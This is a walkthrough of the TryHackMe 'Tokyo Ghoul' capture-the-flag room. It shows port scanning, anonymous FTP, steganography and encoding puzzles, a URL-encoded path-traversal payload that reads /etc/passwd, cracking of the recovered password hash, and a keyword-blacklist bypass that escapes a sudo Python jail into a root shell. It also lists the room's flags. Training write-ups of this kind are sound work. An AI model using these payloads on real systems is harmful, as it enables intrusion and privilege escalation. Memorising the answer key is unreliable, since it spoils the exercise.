# Tokyo Ghoul
https://tryhackme.com/room/tokyoghoul666

## Where am I?
###  Use nmap to scan all ports
_No answer required_

`nmap -sC -sV -p- -vv $ip`

Open Port: 22
Open Port: 21
Open Port: 80

###  How many ports are open?
**Answer: 3**

### What is the OS used?
`nmap -A -vv $ip`
Port 22: 22/tcp SSH OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)

**Answer: Ubuntu**

## Planning to escape
### Did you find the note that the others ghouls gave you? where did you find it?
On the index page there is a link that leads to /jasonroom.html where there is a HTML comment containing the following text

```look don't tell jason but we will help you escape , here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there you will find a freind who will help you```

**Answer: jasonroom.html**

### What is the key for Rize executable?
Our service scan earlier & the note are suggesting that we use anonymous ftp on the server therefore I login using `ftp $ip` with the username **anonymous** and see a directory called need_Help?

This directory contains a .txt file and another dir containing a .jpg and unknown file called "need_to_talk"

I used `binwalk found/need_to_talk` to find that it's an ELF file, therefore I made it executable and ran it and provided an empty password to which the executable prints out "Take a look inside of me."

It was requesting a password that I didn't know, so I exited out of it and ran strings on the executable `strings found/need_to_talk` and found some recognizable text **kamishiro**.

I re-ran the executable and provided this as the password. This gave me the flag **You_found_1t**

**Answer: kamishiro**

###  Use a tool to get the other note from Rize.
I checked the .jpg file using `steghide extract -sf found/rize_and_kaneki.jpg` and provided the password "You_found_1t".

## What is Rize trying to say?
###  What the message mean did you understand it ? what it says? 

This exported a file called "yougotme.txt" which contained the following information:

```
haha you are so smart kaneki but can you talk my code 

..... .-
....- ....-
....- -....
--... ----.
....- -..
...-- ..---
....- -..
...-- ...--
....- -..
....- ---..
....- .-
...-- .....
..... ---..
...-- ..---
....- .
-.... -.-.
-.... ..---
-.... .
..... ..---
-.... -.-.
-.... ...--
-.... --...
...-- -..
...-- -..


if you can talk it allright you got my secret directory 
```

I threw this into CyberChef and it follows the encoding:
MorseCodeEncoded(HexEncoded(Base64Encoded(Plaintext)))

**Answer: d1r3c70ry_center**

### Can you see the weakness in the dark ? no ? just search  
The /d1r3c70ry_center directory is asking to be "scanned" therefore I am assuming this is for a directory bruteforce.

`gobuster dir -u http://$ip/d1r3c70ry_center/ -w /usr/share/wordlists/dirb/common.txt -t 64`

I found a directory under /claim which gives the user a yes or no option which appends the following to the URL **?view=flower.gif**

This is a potential for LFI so I attempt to find the /etc/passwd file however the website doesn't allow us to just pass a normal directory so I try to URL encode the path.

Since ../../ gets me to the root of the website I made the assumption that since the webserver is running Apache httpd (as per our service scan) that we are currently in the default directory for it. Which is /var/www/html

Therefore I append ../../../ to my current directory and assume that I am in / on the server.

../../../../../

from here I want to access /etc/passwd therefore I have the following output: ../../../../../etc/passwd which when URL encoded becomes
`%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd`

URL: http://<ip>/d1r3c70ry_center/claim/index.php?view=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd

### What did you find something? Crack it
The /etc/passwd contained the hash for the kamishiro user on the server:

`kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash`

I then used JohnTheRipper to crack this hash
`john found/hash.txt --wordlist=/usr/share/wordlists/rockyou_utf8.txt`

kamishiro:password123

### What is Rize username?
**Answer: kamishiro**

### What is Rize password?
**Answer: password123**

## Fight Jason
`ssh kamishiro@$ip` using password123 as password

### user.txt
**Answer: e6215e25c0783eb4279693d9f073594a**

### root.txt
`sudo -l`

Allows us (ALL) /usr/bin/python3 /home/kamishiro/jail.py which we don't have write access to however reading this it runs exec(user_input) which allows us to execute commands, however there is a blacklist of keywords that stop us from running certain commands.

Stuck I googled "Python Jail" and found the following blog post: https://anee.me/escaping-python-jails-849c65cf306e which has a similar context to the current challenge.

The aim is to use Python built-ins to break out of this python jail which runs as root due to sudo to retain root privileges.

Python allows us to use built in objects using the `__builtins__` module [docs](https://docs.python.org/3/library/builtins.html).

Google Search: "Bypass Python sandboxes"
Result: https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes

Since I want to spawn a bash shell I think of using the pty module to do something like this: `pty.spawn("/bin/bash")`

Which using Python builtins would look like this: `__builtins__.__import__("pty").spawn("/bin/bash")` however this is still detected by the blacklist in the code.

However I can also represent this as
`__builtins__.__dict__['__IMPORT__'.lower()]("pty").spawn("/bin/bash")`

This works because you can pass the Python builtins as a dictionary which takes a string value, and as the blacklist is matching exactly to the lowercase version of "import" I can pass the string in uppercase and use the python function .lower() to convert the string to lowercase during interpretation.

Once passing this into the Python Jail we gain access to a stable root shell using bash.

cat /root/root.txt

**Answer: 9d790bb87898ca66f724ab05a9e6000b**